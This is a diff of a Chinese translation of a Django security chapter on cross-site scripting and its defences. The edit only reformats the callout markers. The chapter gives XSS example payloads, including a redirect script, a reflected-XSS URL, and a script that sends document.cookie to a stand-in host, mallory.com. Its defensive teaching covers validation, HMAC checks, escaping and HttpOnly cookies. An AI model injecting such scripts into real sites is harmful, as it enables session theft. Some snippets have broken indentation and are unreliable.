@@ -34,7 +34,7 @@ XSS 有三个子类别。每个子类别都由用于注入恶意代码的机制�
 
 ```py
 <script>
-    document.location = "https:/./social.mallory.com";    ❶
+    document.location = "https:/./social.mallory.com";    # ❶
 </script>
 ```
 
@@ -62,9 +62,9 @@ XSS 有三个子类别。每个子类别都由用于注入恶意代码的机制�
 
 ```py
 https:/./search.alice.com/?terms=
-➥ %3Cscript%3E                                          ❶
-➥ document.location=%27https://search.mallory.com%27    ❶
-➥ %3C/script%3E                                         ❶
+➥ %3Cscript%3E                                          # ❶
+➥ document.location=%27https://search.mallory.com%27    # ❶
+➥ %3C/script%3E                                         # ❶
 ```
 
 ❶ 嵌入 URL 的脚本
@@ -88,8 +88,8 @@ Mallory 将这个 URL 发送给 Bob 的短信。他上钩了，点击了链接�
   <head>
     <script>
         const url = new URL(window.location.href);
-        const terms = url.searchParams.get('terms');    ❶
-        document.write('You searched for ' + terms);    ❷
+        const terms = url.searchParams.get('terms');    # ❶
+        document.write('You searched for ' + terms);    # ❷
 
     </script>
   </head>
@@ -151,9 +151,9 @@ XSS 抵御是防御深度的完美示例。本章的其余部分将教你如何�
 <html>
 
     <form method='POST'>
-        {% csrf_token %}            ❶
+        {% csrf_token %}            # ❶
         <table>
-            {{ form.as_table }}     ❷
+            {{ form.as_table }}     # ❷
         </table>
         <input type='submit' value='Submit'>
     </form>
@@ -175,8 +175,8 @@ from django.core.validators import RegexValidator
 ...
 class AuthenticatedMessage(Model):
     message = CharField(max_length=100)
-    hash_value = CharField(max_length=64,                                ❶
-                           validators=[RegexValidator('[0-9a-f]{64}')])  ❷
+    hash_value = CharField(max_length=64,                                # ❶
+                           validators=[RegexValidator('[0-9a-f]{64}')])  # ❷
 ```
 
 ❶ 确保最大长度
@@ -203,14 +203,14 @@ from django.core.exceptions import ValidationError
 ...
 class AuthenticatedMessage(Model):
 ...
-    def clean(self):                                               ❶
- hmac_function = hmac.new(                                  ❷
- b'frown canteen mounted carve',                        ❷
- msg=force_bytes(self.message),                         ❷
- digestmod=hashlib.sha256)                              ❷
-        hash_value = hmac_function.hexdigest()                     ❷
+    def clean(self):                                               # ❶
+ hmac_function = hmac.new(                                  # ❷
+ b'frown canteen mounted carve',                        # ❷
+ msg=force_bytes(self.message),                         # ❷
+ digestmod=hashlib.sha256)                              # ❷
+        hash_value = hmac_function.hexdigest()                     # ❷
 
-        if not hmac.compare_digest(hash_value, self.hash_value):   ❸
+        if not hmac.compare_digest(hash_value, self.hash_value):   # ❸
             raise ValidationError(_('Message not authenticated'),     
                                   code='msg_not_auth')
 ```
@@ -229,10 +229,10 @@ class AuthenticatedMessage(Model):
 from django.views.generic.edit import CreateView
 from messaging.models import AuthenticatedMessage
 
-class CreateAuthenticatedMessageView(CreateView):   ❶
-    model = AuthenticatedMessage                    ❷
-    fields = ['message', 'hash_value']              ❸
-    success_url = '/'                               ❹
+class CreateAuthenticatedMessageView(CreateView):   # ❶
+    model = AuthenticatedMessage                    # ❷
+    fields = ['message', 'hash_value']              # ❸
+    success_url = '/'                               # ❹
 ```
 
 ❶ 继承输入验证和持久性
@@ -267,9 +267,9 @@ class CreateAuthenticatedMessageView(CreateView):   ❶
 >>> 
 >>> hmac.new(
 ...     b'frown canteen mounted carve',
-...     b'from Alice to Bob',                           ❶
+...     b'from Alice to Bob',                           # ❶
 ...     digestmod=hashlib.sha256).hexdigest()
-'E52c83ad9c9cb1ca170ff60e02e302003cd1b3ae3459e35d3...'  ❷
+'E52c83ad9c9cb1ca170ff60e02e302003cd1b3ae3459e35d3...'  # ❷
 ```
 
 ❶ 成为消息表单字段的值
@@ -296,21 +296,21 @@ from messaging.forms import AuthenticatedMessageForm
 class EmailAuthenticatedMessageView(View):
     template = 'messaging/authenticatedmessage_form.html'
 
-    def get(self, request):                              ❶
-        ctx = {'form': AuthenticatedMessageForm(), }     ❶
-        return render(request, self.template, ctx)       ❶
+    def get(self, request):                              # ❶
+        ctx = {'form': AuthenticatedMessageForm(), }     # ❶
+        return render(request, self.template, ctx)       # ❶
 
     def post(self, request):
-        form = AuthenticatedMessageForm(request.POST)    ❷
+        form = AuthenticatedMessageForm(request.POST)    # ❷
 
-        if form.is_valid():                              ❸
+        if form.is_valid():                              # ❸
             message = form.cleaned_data['message']
             subject = form.cleaned_data['hash_value']
             send_mail(subject, message, 'bob@bob.com', ['alice@alice.com'])
             return redirect('/')
 
-        ctx = {'form': form, }                           ❹
-        return render(request, self.template, ctx)       ❹
+        ctx = {'form': form, }                           # ❹
+        return render(request, self.template, ctx)       # ❹
 ```
 
 ❶ 通过空白表单征求用户输入
@@ -332,7 +332,7 @@ from django.core.validators import RegexValidator
 from django.forms import Form, CharField
 
 class AuthenticatedMessageForm(Form):
-    message = CharField(min_length=1, max_length=100)                        ❶
+    message = CharField(min_length=1, max_length=100)                        # ❶
     hash_value = CharField(validators=[RegexValidator(regex='[0-9a-f]{64}')])C
 ```
 
@@ -357,11 +357,11 @@ class AuthenticatedMessageForm(Form):
 
 ...
 
-    def clean_hash_value(self):                                         ❶
+    def clean_hash_value(self):                                         # ❶
         hash_value = self.cleaned_data['hash_value']
         if not re.match('[0-9a-f]{64}', hash_value):
             reason = 'Must be 64 hexadecimal characters'
-            raise ValidationError(_(reason), code='invalid_hash_value') ❷
+            raise ValidationError(_(reason), code='invalid_hash_value') # ❷
         return hash_value
 ```
 
@@ -380,14 +380,14 @@ class AuthenticatedMessageForm(Form):
 
 ...
 
-    def clean(self):                                                ❶
+    def clean(self):                                                # ❶
         super().clean()
- message = self.cleaned_data.get('message')                  ❷
- hash_value = self.cleaned_data.get('hash_value')            ❷
-        ...                                                         ❷
+ message = self.cleaned_data.get('message')                  # ❷
+ hash_value = self.cleaned_data.get('hash_value')            # ❷
+        ...                                                         # ❷
         if condition:
             reason = 'Message not authenticated'
-            raise ValidationError(_(reason), code='msg_not_auth')   ❸
+            raise ValidationError(_(reason), code='msg_not_auth')   # ❸
 ```
 
 ❶ 被 Django 自动调用
@@ -427,7 +427,7 @@ class AuthenticatedMessageForm(Form):
 ```py
 <html>
     <div>
-        {{ fetched_from_db }}     ❶
+        {{ fetched_from_db }}     # ❶
     <div>
 </html>
 ```
@@ -439,7 +439,7 @@ class AuthenticatedMessageForm(Form):
 ```py
 <html>
     <div>
-        {{ request.GET.query_parameter }}    ❶
+        {{ request.GET.query_parameter }}    # ❶
     <div>
 </html>
 ```
@@ -452,12 +452,12 @@ class AuthenticatedMessageForm(Form):
 $ python manage.py shell
 >>> from django.template import Template, Context
 >>> 
->>> template = Template('<html>{{ var }}</html>')              ❶
->>> poison = '<script>/* malicious */</script>'                ❷
+>>> template = Template('<html>{{ var }}</html>')              # ❶
+>>> poison = '<script>/* malicious */</script>'                # ❷
 >>> ctx = Context({'var': poison})
 >>> 
->>> template.render(ctx)                                       ❸
-'<html>&lt;script&gt;/* malicious */&lt;/script&gt;</html>'    ❹
+>>> template.render(ctx)                                       # ❸
+'<html>&lt;script&gt;/* malicious */&lt;/script&gt;</html>'    # ❹
 ```
 
 ❶ 创建一个简单的模板
@@ -476,11 +476,11 @@ Django 的模板引擎提供了许多内置标记、过滤器和实用函数用�
 
 ```py
 <html>
-    {% autoescape off %}        ❶
+    {% autoescape off %}        # ❶
         <div>
             {{ request.GET.query_parameter }}
         </div>
-    {% endautoescape %}         ❷
+    {% endautoescape %}         # ❷
 </html>
 ```
 
@@ -509,16 +509,16 @@ $ python manage.py shell
 >>> from django.template import Template, Context
 >>> from django.utils.safestring import mark_safe
 >>> 
->>> template = Template('<html>{{ var }}</html>')        ❶
+>>> template = Template('<html>{{ var }}</html>')        # ❶
 >>> 
->>> native_string = '<script>/* malicious */</script>'   ❷
+>>> native_string = '<script>/* malicious */</script>'   # ❷
 >>> safe_string = mark_safe(native_string)
 >>> type(safe_string)
 <class 'django.utils.safestring.SafeString'>
 >>> 
 >>> ctx = Context({'var': safe_string})
->>> template.render(ctx)                                 ❸
-'<html><script>/* malicious */</script></html>'          ❹
+>>> template.render(ctx)                                 # ❸
+'<html><script>/* malicious */</script></html>'          # ❹
 ```
 
 ❶ 创建一个简单的模板
@@ -533,11 +533,11 @@ $ python manage.py shell
 
 ```py
 <html>
-    {% autoescape off %}                               ❶
+    {% autoescape off %}                               # ❶
         <div>
-            {{ request.GET.query_parameter|escape }}   ❷
+            {{ request.GET.query_parameter|escape }}   # ❷
         </div>
-    {% endautoescape %}                                ❸
+    {% endautoescape %}                                # ❸
 </html>
 ```
 
@@ -554,7 +554,7 @@ $ python manage.py shell
 >>> 
 >>> poison = '<script>/* malicious */</script>'
 >>> escape(poison)
-'&lt;script&gt;/* malicious */&lt;/script&gt;'     ❶
+'&lt;script&gt;/* malicious */&lt;/script&gt;'     # ❶
 ```
 
 ❶ 中和 HTML
@@ -599,8 +599,8 @@ $ python manage.py shell
 
 ```py
 <script>
-    const url = 'https:/./mallory.com/?loot=' + document.cookie;   ❶
-    document.write('<img src="' + url + '">');                    ❷
+    const url = 'https:/./mallory.com/?loot=' + document.cookie;   # ❶
+    document.write('<img src="' + url + '">');                    # ❷
 </script>
 ```
 
@@ -637,11 +637,11 @@ class CookieSettingView(View):
         ...
 
         response = HttpResponse()
-        response.set_cookie(         ❶
+        response.set_cookie(         # ❶
             'cookie-name',
             'cookie-value',
                 ...
-            httponly=True)           ❷
+            httponly=True)           # ❷
 
         return response
 ```
